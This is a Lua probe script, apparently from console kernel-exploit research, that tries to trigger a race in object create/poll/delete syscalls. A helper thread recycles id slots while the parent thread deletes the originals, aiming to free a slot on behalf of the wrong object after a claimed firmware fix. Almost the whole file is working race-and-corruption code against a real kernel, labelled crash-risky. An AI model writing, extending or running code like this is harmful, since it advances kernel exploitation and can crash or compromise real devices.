-- CRASH_CLASS: RISKY
-- PROBE 498b: delete against a slot that another thread keeps re-populating
-- 498a proved a serialized second delete always fails (0x80020003). 497f showed two
-- concurrent deletes of one id both succeed. The 14.20 fix closes a stronger shape:
-- the entry is re-validated after the lock drop, so a slot that is freed and then
-- re-registered during that window is freed on behalf of the wrong object. Here the
-- helper thread recycles the same id slots (delete, create, poll) while the parent
-- keeps deleting the original list, so a parent delete can arrive after the helper
-- already put a new object in that slot.
print("=== PROBE 498b: delete against a recycled slot ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function addrnum(v)
    if type(v) == "table" then
        local h, l = v.h, v.l
        if type(h) == "number" and type(l) == "number" then return h * 4294967296 + l end
        if v.tonumber then
            local n = v:tonumber()
            if type(n) == "number" then return n end
        end
        error("cannot convert address value")
    end
    return to_num(v)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local N, ITER = 16, 4
local data, out = memory.alloc(0x2000), memory.alloc(0x100)
local ids0, ids1, res = memory.alloc(N * 4), memory.alloc(N * 4), memory.alloc(N * 4)
local gate = memory.alloc(0x100)
local sc669, sc664, sc662 = make_syscall(669), make_syscall(664), make_syscall(662)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
local made = 0
for i = 0, N - 1 do
  for off = 0, 0xFF, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  local id = to_num(memory.read_dword(out))
  if ok and id > 0 then
    pcall(function() memory.write_dword(ids0 + i * 4, id) end)
    pcall(function() return sc664(uint64(ids0 + i * 4), uint64(1), uint64(res)) end)
    made = made + 1
  end
end
print(string.format("prepared %d objects", made))
if made == 0 then return end
for off = 0, 0xFF, 4 do
  pcall(function() memory.write_dword(gate + off, 0) end)
  pcall(function() memory.write_dword(gate + 0x80 + off, 0) end)
end
local body = "local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end\n" ..
  "local c, p, d = mk(669), mk(664), mk(662)\n" ..
  "while memory.read_dword(GATE) == 0 do end\n" ..
  "for it = 1, ITER do\n" ..
  "  pcall(function() d(IDS0, N, RES) end)\n" ..
  "  for i = 0, N - 1 do\n" ..
  "    pcall(function() memory.write_dword(OUT, 0) end)\n" ..
  "    pcall(function() c(1, DATA, 1, 1, OUT) end)\n" ..
  "    local id = memory.read_dword(OUT)\n" ..
  "    pcall(function() memory.write_dword(IDS1 + i * 4, id) end)\n" ..
  "    pcall(function() p(IDS1 + i * 4, 1, RES) end)\n" ..
  "  end\n" ..
  "end\n" ..
  "memory.write_dword(GATE + 0x80, 1)\n"
for pat, val in pairs({ ["GATE"] = gate, ["IDS0"] = ids0, ["IDS1"] = ids1, ["RES"] = res,
                        ["OUT"] = out, ["DATA"] = data }) do
  local a = addrnum(val)
  print(string.format("  %s=%s", pat, tostring(a)))
  body = body:gsub(pat, tostring(a))
end
body = body:gsub("ITER", tostring(ITER)):gsub("N", tostring(N))
print("spawning")
local ok, thr = pcall(run_lua_code_in_new_thread, body, { async = true })
if not ok or type(thr) ~= "table" then print("spawn failed"); return end
pcall(function() memory.write_dword(gate, 1) end)
local zeros, others = 0, 0
for it = 1, ITER do
  print(string.format("parent pass %d", it))
  for off = 0, N * 4 - 1, 4 do pcall(function() memory.write_dword(res + off, 0x77777777) end) end
  pcall(function() return sc662(uint64(ids0), uint64(N), uint64(res)) end)
  for i = 0, N - 1 do
    if to_num(memory.read_dword(res + i * 4)) == 0 then zeros = zeros + 1 else others = others + 1 end
  end
end
print(string.format("parent deletes: zeros=%d other=%d", zeros, others))
local jspins = 0
while to_num(memory.read_dword(gate + 0x80)) == 0 and jspins < 4000000 do jspins = jspins + 1 end
pcall(function() return thr:join() end)
print("joined")
-- did recycling leave the table consistent? new objects must create, poll and delete cleanly
local bad, good = 0, 0
for i = 1, 16 do
  for off = 0, 0xFF, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local okc = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  local id = to_num(memory.read_dword(out))
  if okc and id > 0 then
    pcall(function() memory.write_dword(ids1, id) end)
    pcall(function() return sc664(uint64(ids1), uint64(1), uint64(res)) end)
    pcall(function() return sc662(uint64(ids1), uint64(1), uint64(res)) end)
    if to_num(memory.read_dword(res)) == 0 then good = good + 1 else bad = bad + 1 end
  else
    bad = bad + 1
  end
end
print(string.format("post-race create+poll+delete: clean=%d bad=%d", good, bad))
print("=== PROBE 498b COMPLETE ===")
